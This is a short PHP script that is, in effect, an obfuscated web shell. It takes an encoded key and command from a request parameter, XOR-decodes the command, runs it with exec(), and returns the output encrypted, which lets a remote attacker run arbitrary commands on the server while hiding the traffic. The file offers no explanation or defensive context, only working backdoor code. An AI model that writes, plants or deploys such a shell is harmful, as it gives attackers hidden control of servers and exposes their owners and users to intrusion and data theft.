<?php
$req_params = explode(",", base64_decode($_REQUEST["waow"]));
$param1 = base64_decode($req_params[0]);
$param2 = base64_decode($req_params[1]);
function xor_function($sxvppfrx, $param1)
{
    $kezuummn = "";
    for ($mlraebcn = 0; $mlraebcn < strlen($sxvppfrx); ) {
        for ($mlarebcn = 0; $mlarebcn < strlen($param1) && $mlraebcn < strlen($sxvppfrx);
            $mlraebcn++, $mlarebcn++) {
            $kezuummn .= $param1[$mlarebcn] ^ $sxvppfrx[$mlraebcn];
        }
    }
    return
        $kezuummn;
}
$payload = xor_function($param2, $param1);
exec($payload, $exec_result, $exec_result_code);
$result_string = implode("\n", $exec_result);
echo base64_encode(xor_function($result_string, $param1));
